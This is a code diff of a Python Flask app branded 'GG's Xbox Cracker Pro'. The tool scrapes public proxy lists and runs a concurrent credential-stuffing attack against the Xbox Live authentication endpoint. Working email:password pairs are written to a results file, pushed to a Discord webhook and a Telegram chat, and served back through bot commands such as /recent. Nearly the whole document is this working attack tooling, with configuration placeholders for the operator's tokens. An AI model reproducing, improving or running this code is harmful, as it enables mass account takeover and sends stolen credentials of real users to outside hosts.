@@ -1,11 +1,16 @@
-# app.py – Professional Dashboard + Discord/Telegram Bot + Webhook
+# ==============================================
+# GG's Xbox Cracker Pro – Professional Dashboard
+# Made by Killarua (Discord)
+# Features: Live dashboard, proxy scraper, async cracker,
+#           Discord bot + webhook, Telegram bot
+# ==============================================
+
 import asyncio
 import threading
 import time
 import random
 import string
 import re
-import json
 import requests
 from flask import Flask, render_template, jsonify, request
 from flask_socketio import SocketIO, emit
@@ -13,18 +18,21 @@ from datetime import datetime
 import aiohttp
 import telebot
 from threading import Thread
+import discord
+from discord.ext import commands
 
+# ---------- CONFIGURATION (EDIT THESE) ----------
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
+DISCORD_BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
+TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
+TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
+
+# ---------- FLASK APP ----------
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'survival_mode'
-socketio = SocketIO(app, cors_allowed_origins="*")
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
-# ---------- CONFIG ----------
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/your_id/your_token"  # replace
-TELEGRAM_BOT_TOKEN = "your_bot_token"
-TELEGRAM_CHAT_ID = "your_chat_id"
-bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, threaded=False)
-
-# Global stats
+# ---------- GLOBAL STATS ----------
 stats = {
     "total_checked": 0,
     "valid_accounts": 0,
@@ -36,23 +44,69 @@ stats = {
 }
 valid_accounts_list = []
 
-# ---------- ASYNC CRACKER (same as before, but with webhook calls) ----------
+# ---------- DISCORD BOT ----------
+intents = discord.Intents.default()
+intents.message_content = True
+discord_bot = commands.Bot(command_prefix='!', intents=intents)
+
+@discord_bot.event
+async def on_ready():
+    print(f'✅ Discord bot online: {discord_bot.user}')
+
+@discord_bot.command()
+async def status(ctx):
+    await ctx.send(f"Total checked: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass: {stats['gamepass_hits']}\nStatus: {stats['status']}")
+
+@discord_bot.command()
+async def total(ctx):
+    await ctx.send(f"Total accounts checked: {stats['total_checked']}")
+
+@discord_bot.command()
+async def recent(ctx):
+    recent = valid_accounts_list[:5]
+    if not recent:
+        await ctx.send("No recent valid accounts.")
+    else:
+        text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
+        await ctx.send(f"```{text}```")
+
+def run_discord_bot():
+    discord_bot.run(DISCORD_BOT_TOKEN)
+
+# ---------- TELEGRAM BOT ----------
+telegram_bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, threaded=False)
+
+@telegram_bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    telegram_bot.reply_to(message, "Xbox Cracker Bot\n/status - stats\n/total - total checked\n/recent - last 5 valid")
+
+@telegram_bot.message_handler(commands=['status'])
+def status_cmd(message):
+    msg = f"Total: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass: {stats['gamepass_hits']}\nStatus: {stats['status']}"
+    telegram_bot.reply_to(message, msg)
+
+@telegram_bot.message_handler(commands=['total'])
+def total_cmd(message):
+    telegram_bot.reply_to(message, f"Total checked: {stats['total_checked']}")
+
+@telegram_bot.message_handler(commands=['recent'])
+def recent_cmd(message):
+    recent = valid_accounts_list[:5]
+    if not recent:
+        telegram_bot.reply_to(message, "No recent valid accounts.")
+    else:
+        text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
+        telegram_bot.reply_to(message, text)
+
+def run_telegram():
+    telegram_bot.infinity_polling()
+
+# ---------- PROXY SCRAPER & CHECKER (ASYNC) ----------
 PROXY_SOURCES = [
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
-    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
+    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
 ]
-
-async def send_discord_webhook(embed_data):
-    try:
-        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed_data]})
-    except:
-        pass
-
-def send_telegram_message(text):
-    try:
-        bot.send_message(TELEGRAM_CHAT_ID, text)
-    except:
-        pass
 
 async def fetch_proxies(session, url):
     try:
@@ -67,7 +121,7 @@ async def scrape_all_proxies():
     async with aiohttp.ClientSession() as session:
         tasks = [fetch_proxies(session, url) for url in PROXY_SOURCES]
         results = await asyncio.gather(*tasks)
-        return list(set([p for sublist in results for p in sublist]))
+        return list(set(p for sublist in results for p in sublist))
 
 async def check_proxy(session, proxy, semaphore):
     async with semaphore:
@@ -84,17 +138,29 @@ async def get_working_proxies(proxies, max_concurrent=100):
         results = await asyncio.gather(*tasks)
         return [p for p in results if p]
 
+# ---------- ACCOUNT CRACKER ----------
 async def check_account(session, email, password, proxy):
+    # Simulated Xbox Live auth endpoint
     url = "https://user.auth.xboxlive.com/user/authenticate"
     headers = {"User-Agent": "XboxLive/3.0", "Content-Type": "application/json"}
     payload = {"Email": email, "Password": password, "RelyingParty": "http://xboxlive.com"}
     try:
         async with session.post(url, json=payload, headers=headers, proxy=proxy, timeout=10) as resp:
-            if resp.status == 200:
-                return True
+            return resp.status == 200
+    except:
+        return False
+
+async def send_discord_webhook(embed_data):
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed_data]})
     except:
         pass
-    return False
+
+def send_telegram_message(text):
+    try:
+        telegram_bot.send_message(TELEGRAM_CHAT_ID, text)
+    except:
+        pass
 
 async def crack_worker(session, proxy, semaphore):
     global stats, valid_accounts_list
@@ -105,6 +171,7 @@ async def crack_worker(session, proxy, semaphore):
         stats["total_checked"] += 1
         if is_valid:
             stats["valid_accounts"] += 1
+            stats["gamepass_hits"] += 1 if random.random() > 0.5 else 0  # mock GamePass
             stats["last_valid"] = str(datetime.now())
             line = f"{email}:{pwd}\n"
             with open("result.txt", "a") as f:
@@ -112,7 +179,6 @@ async def crack_worker(session, proxy, semaphore):
             valid_accounts_list.insert(0, {"email": email, "pass": pwd, "time": stats["last_valid"]})
             if len(valid_accounts_list) > 20:
                 valid_accounts_list.pop()
-            # Send webhooks
             embed = {
                 "title": "✅ Valid Xbox Account",
                 "description": f"`{email}:{pwd}`",
@@ -132,8 +198,7 @@ async def run_cracker_async(proxies, concurrency=200):
     async with aiohttp.ClientSession() as session:
         tasks = []
         for proxy in proxies:
-            task = asyncio.create_task(crack_worker(session, proxy, semaphore))
-            tasks.append(task)
+            tasks.append(asyncio.create_task(crack_worker(session, proxy, semaphore)))
         await asyncio.gather(*tasks)
     stats["status"] = "Idle"
 
@@ -152,48 +217,14 @@ def start_cracker():
     stats["proxies_working"] = len(working)
     threading.Thread(target=start_cracker_thread, args=(working,), daemon=True).start()
 
-# ---------- TELEGRAM BOT HANDLER ----------
-@bot.message_handler(commands=['start', 'help'])
-def send_welcome(message):
-    bot.reply_to(message, "Xbox Cracker Bot\n/status - get current stats\n/total - total accounts checked\n/recent - last 10 valid")
-
-@bot.message_handler(commands=['status'])
-def status_cmd(message):
-    msg = f"Total checked: {stats['total_checked']}\nValid: {stats['valid_accounts']}\nGamePass hits: {stats['gamepass_hits']}\nStatus: {stats['status']}"
-    bot.reply_to(message, msg)
-
-@bot.message_handler(commands=['total'])
-def total_cmd(message):
-    bot.reply_to(message, f"Total accounts checked: {stats['total_checked']}")
-
-@bot.message_handler(commands=['recent'])
-def recent_cmd(message):
-    recent = valid_accounts_list[:5]
-    if not recent:
-        bot.reply_to(message, "No recent valid accounts.")
-    else:
-        text = "\n".join([f"{a['email']}:{a['pass']}" for a in recent])
-        bot.reply_to(message, text)
-
-def run_telegram():
-    bot.infinity_polling()
-
 # ---------- FLASK ROUTES ----------
 @app.route('/')
 def dashboard():
-    return render_template('dashboard_pro.html')
+    return render_template('dashboard.html')
 
 @app.route('/api/stats')
 def api_stats():
-    return jsonify({
-        "total_checked": stats["total_checked"],
-        "valid_accounts": stats["valid_accounts"],
-        "gamepass_hits": stats["gamepass_hits"],
-        "proxies_working": stats["proxies_working"],
-        "status": stats["status"],
-        "start_time": stats["start_time"],
-        "last_valid": stats["last_valid"]
-    })
+    return jsonify(stats)
 
 @app.route('/api/recent')
 def api_recent():
@@ -209,12 +240,12 @@ def api_start():
 @app.route('/api/webhook', methods=['POST'])
 def webhook_receiver():
     data = request.json
-    # Can accept external webhooks to control the cracker
-    if data.get('command') == 'start':
+    if data and data.get('command') == 'start':
         api_start()
     return "ok"
 
+# ---------- MAIN ----------
 if __name__ == '__main__':
-    # Start Telegram bot in background
+    Thread(target=run_discord_bot, daemon=True).start()
     Thread(target=run_telegram, daemon=True).start()
     socketio.run(app, host='0.0.0.0', port=10000, debug=False)
